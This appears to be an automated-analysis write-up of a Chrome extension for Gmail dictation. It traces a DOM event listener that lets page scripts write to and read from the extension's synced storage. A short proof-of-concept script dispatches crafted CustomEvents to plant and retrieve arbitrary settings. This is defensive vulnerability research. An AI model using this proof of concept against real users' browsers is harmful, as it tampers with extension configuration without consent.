# CoCo Analysis: eggdmhdpffgikgakkfojgiledkekfdce

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_DictationForGmail → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/eggdmhdpffgikgakkfojgiledkekfdce/opgen_generated_files/cs_0.js
Line 587: document.addEventListener("DictationForGmail", function(e) {...})
Line 620: if(typeof e.detail.data === 'undefined') {...}
Line 627-629: chrome.storage.sync.set({GMDE_options: e.detail.data});

**Code:**

```javascript
// Content script - DOM event listener (entry point)
document.addEventListener("DictationForGmail", function(e) {
  if(typeof e.detail === 'undefined') {
    return;
  } else if(e.detail === null) {
    return;
  } else if(typeof e.detail.cmd === 'undefined') {
    return;
  }

  // GetSettings - reads from storage and sends back to page
  if(e.detail.cmd === 'GetSettings') {
    if(typeof e.detail.callId === 'undefined') {
      return;
    }

    var replyEventName = `DictationForGmailReply_${e.detail.callId}`;

    chrome.storage.sync.get("GMDE_options", function (opts) {
      const options = opts.GMDE_options || {};

      // Send storage data back to page
      document.dispatchEvent(
        new CustomEvent(replyEventName, {
          detail: {
            data: options // ← attacker-controlled data from storage
          }
        })
      );
    });
  }
  // SetSettings - writes to storage from page event
  else if(e.detail.cmd === 'SetSettings') {
    if(typeof e.detail.data === 'undefined') {
      return;
    } else if(e.detail.data === null) {
      return;
    }

    chrome.storage.sync.set({
      GMDE_options: e.detail.data // ← attacker-controlled data
    });
  }
  // ... other commands
});
```

**Classification:** TRUE POSITIVE

**Exploitable by:** `*://mail.google.com/*` (from manifest.json content_scripts matches)

**Attack Vector:** DOM event (document.addEventListener)

**Attack:**

```javascript
// On mail.google.com, attacker-controlled script injects malicious data
// Step 1: Write malicious data to storage
document.dispatchEvent(new CustomEvent('DictationForGmail', {
  detail: {
    cmd: 'SetSettings',
    data: {
      maliciousKey: 'maliciousValue',
      // Any arbitrary data the attacker wants to persist
    }
  }
}));

// Step 2: Read back the malicious data
const callId = Math.random().toString(36);
document.addEventListener(`DictationForGmailReply_${callId}`, function(e) {
  console.log('Retrieved malicious data:', e.detail.data);
  // Attacker receives: {maliciousKey: 'maliciousValue', ...}
}, {once: true});

document.dispatchEvent(new CustomEvent('DictationForGmail', {
  detail: {
    cmd: 'GetSettings',
    callId: callId
  }
}));
```

**Impact:** Complete storage exploitation chain. An attacker controlling mail.google.com (per threat model, we treat domains as attacker-controllable) can write arbitrary data to chrome.storage.sync and retrieve it back. While the direct impact is limited to persisting and retrieving attacker-controlled data, this represents a complete flow from attacker-controlled source → privileged storage → attacker-accessible output. The attacker can persist malicious configuration that affects the extension's behavior across sessions.

**Note on Threat Model:** Per the methodology, domain restrictions are not security boundaries. Even though this extension only runs on mail.google.com, we analyze it as if the attacker controls that page. This is standard practice in extension security analysis - we assess IF exploitable when the attacker controls the page, not the likelihood of domain compromise.
